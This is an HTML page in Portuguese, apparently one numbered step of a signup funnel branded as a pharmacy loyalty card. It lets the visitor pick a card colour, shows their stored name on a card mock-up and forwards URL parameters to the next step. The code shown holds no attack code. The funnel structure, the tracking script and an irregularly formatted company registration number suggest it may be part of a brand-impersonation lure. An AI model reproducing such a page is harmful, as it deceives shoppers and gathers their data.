    <link href="https://fonts.googleapis.com/css2?family=Sora:wght@400;700&display=swap" rel="stylesheet">

<script src="/ml/utmify.js"></script>
    <style>
        body {
            margin: 0;
            font-family: 'Sora', sans-serif;
            background-color: #ffffff;
            text-align: center;
        }
        .header {
            display: flex;
            align-items: center;
            padding: 10px;
            border-bottom: 1px solid #d5d8dd;
            background-color: #e9ebee;
        }
        .logo {
            width: 125px;
            margin-left: 20px;
            padding: 10px;
        }
        .container {
            max-width: 600px;
            margin: 20px auto;
            padding: 0 20px;
        }
        h1 {
            font-size: 24px;
            color: #333;
            margin-bottom: 10px;
        }
        .subtitle {
            font-size: 16px;
            color: #666;
            margin-bottom: 30px;
        }
        .color-options {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin: 30px 0;
        }
        .color-option {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            border: 2px solid transparent;
            cursor: pointer;
            transition: transform 0.2s;
        }
        .color-option:hover {
            transform: scale(1.1);
        }
        .color-option.selected {
            border-color: #14315c;
        }
        .continue-btn {
            background-color: #14315c;
            color: #ffffff;
            padding: 15px 40px;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 20px;
        }
        .button {
            background-color: #14315c;
            color: #ffffff;
            padding: 15px;
            border-radius: 8px;
            border: none;
            width: 100%;
            font-family: 'Sora', sans-serif;
            font-weight: bold;
            font-size: 16px;
            cursor: pointer;
        }
    </style>
<style id="lov-white-bg">html,body{background-color:#fff !important;background-image:none !important;}</style>
</head>
<body>
    <div class="header">
        <img src="logo.png" alt="Logo Drogarias Campeã" class="logo">
    </div>

    <div class="container">
        <h1 style="text-align: center; font-size: 20px;">Personalize o seu cartão</h1>

        <style>
            .color-options { display: flex; justify-content: center; gap: 12px; flex-wrap: wrap; margin: 15px 0 20px; }
            .color-option { width: 44px; height: 44px; border-radius: 50%; cursor: pointer; border: 3px solid transparent; box-shadow: 0 2px 6px rgba(0,0,0,0.15); transition: transform .15s ease, border-color .15s ease; }
            .color-option:hover { transform: scale(1.08); }
            .color-option.selected { border-color: #14315c; transform: scale(1.08); }

            /* ===== Cartão — imagem real, proporção 1.586:1 ===== */
            .card-wrap { margin: 10px auto 20px; max-width: 360px; width: 100%; }
            .card {
                position: relative; width: 100%; aspect-ratio: 1586 / 1000;
                border-radius: 4.5% / 7%; overflow: hidden;
                box-shadow: 0 14px 30px rgba(0,0,0,.28);
                font-family: 'Sora', sans-serif;
                container-type: inline-size;
            }
            .card .art { position:absolute; inset:0; width:100%; height:100%; object-fit: cover; display:block; z-index:0; }
            .card .shine { position:absolute; top:0; left:-100%; width:55%; height:100%; z-index:4; pointer-events:none;
                background: linear-gradient(90deg, transparent, rgba(255,255,255,.16), transparent);
                animation: shine 4s infinite; }
            @keyframes shine { 0%{left:-100%} 40%{left:130%} 100%{left:130%} }

            /* dados sobrepostos — escalam com a largura do cartão (cqw) */
            .card .num { position:absolute; z-index:3; left:7%; right:7%; top:57.5%;
                font-size: 5.6cqw; font-weight:600; letter-spacing: .55cqw; white-space:nowrap;
                color: var(--fg,#fff); text-shadow: 0 .3cqw .6cqw rgba(0,0,0,.55); }
            .card .holder { position:absolute; z-index:3; left:7%; right:7%; top:69%;
                font-size: 4.4cqw; letter-spacing: .35cqw; text-transform:uppercase; white-space:nowrap;
                overflow:hidden; text-overflow:ellipsis;
                color: var(--fg,#fff); text-shadow: 0 .3cqw .6cqw rgba(0,0,0,.55); }

            /* ===== TEMAS (apenas cor do texto sobreposto) ===== */
            .theme-teal  { --fg:#ffffff; }
            .theme-red   { --fg:#ffffff; }
            .theme-black { --fg:#e9d9a6; }
            .theme-green { --fg:#f3e4bd; }
            .theme-blue  { --fg:#ffffff; }
        </style>

        <div class="color-options" id="colorOptions">
            <div class="color-option selected" data-theme="teal"  style="background: linear-gradient(135deg,#35bdb4,#0f8a86);" onclick="changeCardTheme(this,'teal')"></div>
            <div class="color-option" data-theme="red"   style="background: linear-gradient(105deg,#a4132a 50%,#121212 50%);" onclick="changeCardTheme(this,'red')"></div>
            <div class="color-option" data-theme="black" style="background: linear-gradient(135deg,#2a2a2a,#000 70%);" onclick="changeCardTheme(this,'black')"></div>
            <div class="color-option" data-theme="green" style="background: linear-gradient(135deg,#0d6b45,#063b26);" onclick="changeCardTheme(this,'green')"></div>
            <div class="color-option" data-theme="blue"  style="background: linear-gradient(135deg,#1b56b8,#08214d);" onclick="changeCardTheme(this,'blue')"></div>
        </div>

        <div class="card-wrap">
            <div class="card theme-teal" id="cardEl">
                <img class="art" id="cardArt" src="/assets/card-teal.png" alt="Cartão Drogarias Campeã">
                <div class="num">0000 0000 0000 0000</div>
                <div class="holder" id="cardName">Nome do cliente</div>
                <div class="shine"></div>
            </div>
        </div>



        <script>
            (function(){
                try {
                    var d = JSON.parse(localStorage.getItem('dadosUsuario'));
                    if (d && d.NOME_CARTAO) {
                        document.getElementById('cardName').textContent = d.NOME_CARTAO;
                    } else if (d && d.NOME) {
                        var parts = String(d.NOME).trim().toUpperCase().split(/\s+/).filter(function(p){ return p; });
                        if (parts.length > 2 && parts.join(' ').length > 24) {
                            var first = parts[0];
                            var last = parts[parts.length - 1];
                            var middle = parts.slice(1, -1).map(function(p){ return p.charAt(0) + '.'; }).join(' ');
                            document.getElementById('cardName').textContent = (first + ' ' + middle + ' ' + last).trim();
                        } else {
                            document.getElementById('cardName').textContent = parts.join(' ');
                        }
                    }
                } catch(e){}
            })();

            var CARD_ART = {
                teal:  '/assets/card-teal.png',
                red:   '/assets/card-red.png',
                black: '/assets/card-black.png',
                green: '/assets/card-green.png',
                blue:  '/assets/card-blue.png'
            };
            Object.keys(CARD_ART).forEach(function(k){ var i = new Image(); i.src = CARD_ART[k]; });

            function changeCardTheme(el, theme){
                var card = document.getElementById('cardEl');
                card.className = 'card theme-' + theme;
                document.getElementById('cardArt').src = CARD_ART[theme] || CARD_ART.teal;
                document.querySelectorAll('#colorOptions .color-option').forEach(function(o){ o.classList.remove('selected'); });
                el.classList.add('selected');
                localStorage.setItem('cardTheme', theme);
            }


            window.addEventListener('load', function(){
                var saved = localStorage.getItem('cardTheme');
                if (!saved) return;
                var opt = document.querySelector('#colorOptions .color-option[data-theme="'+saved+'"]');
                if (opt) changeCardTheme(opt, saved);
            });
        </script>

        <button onclick="window.location.href = buildUrlWithParams('../12/index.html')" class="button">
            Continuar
        </button>

        <footer style="padding: 10px 15px; text-align: center; margin-top: 50px; background-color: #f9f9f9; border-top: 1px solid #eaeaea; font-family: 'Sora', sans-serif;">
            <div style="max-width: 600px; margin: 0 auto;">
                <p style="color: #777; font-size: 10px; margin-bottom: 5px; line-height: 1.2;">
                    Drogarias Campeã Brasil LTDA | CNPJ: 79.379.491.0008-50
                </p>
                <p style="color: #777; font-size: 10px; margin-bottom: 5px; line-height: 1.2;">
                    Av. das Nações Unidas, 3000 - Bonfim, Osasco - SP, 06233-903
                </p>
                <p style="color: #999; font-size: 9px; margin-top: 5px;">
                    © 2025 - Todos os direitos reservados
                </p>
            </div>
        </footer>
    </div>

    <script>
            function getUrlParams() {
                const params = {};
                const queryString = window.location.search;
                const urlParams = new URLSearchParams(queryString);
                
                for (const [key, value] of urlParams) {
                    params[key] = value;
                }
                return params;
            }

            function buildUrlWithParams(baseUrl) {
                const params = getUrlParams();
                const url = new URL(baseUrl, window.location);
                Object.keys(params).forEach(key => {
                    url.searchParams.append(key, params[key]);
                });
                
                return url.toString();
            }
    </script>




</body></html>
